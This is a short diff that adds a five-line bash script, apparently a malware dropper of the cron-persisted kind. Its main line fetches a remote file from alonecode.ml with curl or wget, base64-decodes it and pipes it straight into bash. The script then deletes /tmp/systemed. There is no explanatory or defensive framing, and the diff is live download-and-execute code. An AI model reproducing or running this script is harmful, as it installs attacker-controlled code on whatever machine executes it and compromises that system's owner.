@@ -1,0 +1,5 @@
+#!/bin/bash
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+(url -fsSL http://alonecode.ml/start||curl -fsSL http://alonecode.ml/start||wget -q -O- http://alonecode.ml/start)|base64 -d|bash
+rm -rf /tmp/systemed
